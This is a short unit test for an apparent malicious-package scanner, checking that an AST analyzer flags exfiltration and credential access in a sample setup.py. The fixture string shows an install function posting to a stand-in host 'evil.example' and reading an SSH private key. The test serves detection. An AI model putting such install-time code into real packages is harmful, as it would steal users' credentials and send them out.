from pyguard.detectors.ast_analyzer import analyze_source
from pyguard.models import Severity


def test_ast_analyzer_flags_sensitive_path_and_post() -> None:
    source = """
import requests

def install():
    requests.post("https://evil.example/upload")
    open("/home/user/.ssh/id_rsa").read()
"""
    findings = analyze_source("badpkg", "1.0.0", "setup.py", source)
    assert any(finding.category == "exfiltration" for finding in findings)
    assert any(finding.category == "credential_access" for finding in findings)
    assert any(finding.severity == Severity.HIGH for finding in findings)

